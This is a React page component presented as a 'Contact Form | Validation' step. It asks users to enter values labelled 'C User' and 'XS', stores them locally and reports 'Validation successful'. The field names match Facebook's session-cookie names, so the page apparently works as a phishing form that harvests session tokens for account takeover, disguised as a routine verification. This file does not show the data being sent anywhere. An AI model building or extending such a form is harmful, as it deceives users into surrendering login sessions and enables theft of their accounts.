import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { useLocation } from "wouter";
import { Button } from "@/components/ui/button";
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { validationFormSchema } from "@/lib/form-schemas";
import MetaTags from "@/components/meta-tags";
import { useToast } from "@/hooks/use-toast";

export default function Validation() {
  const [_, navigate] = useLocation();
  const { toast } = useToast();
  
  const form = useForm({
    resolver: zodResolver(validationFormSchema),
    defaultValues: {
      c_user: "",
      xs: ""
    }
  });

  function onSubmit(data: any) {
    localStorage.setItem('validation_data', JSON.stringify(data));
    toast({
      title: "Validation successful",
      description: "Please proceed to the next step"
    });
    navigate("/confirmation");
  }

  return (
    <>
      <MetaTags 
        title="Contact Form | Validation"
        description="Please enter your validation details"
      />
      
      <div className="container max-w-lg mx-auto py-12">
        <Card>
          <CardHeader>
            <CardTitle>Validation Details</CardTitle>
          </CardHeader>
          <CardContent>
            <Form {...form}>
              <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
                <FormField
                  control={form.control}
                  name="c_user"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>C User</FormLabel>
                      <FormControl>
                        <Input {...field} />
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />
                
                <FormField
                  control={form.control}
                  name="xs"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>XS</FormLabel>
                      <FormControl>
                        <Input {...field} />
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />
                
                <Button type="submit" className="w-full">Continue</Button>
              </form>
            </Form>
          </CardContent>
        </Card>
      </div>
    </>
  );
}
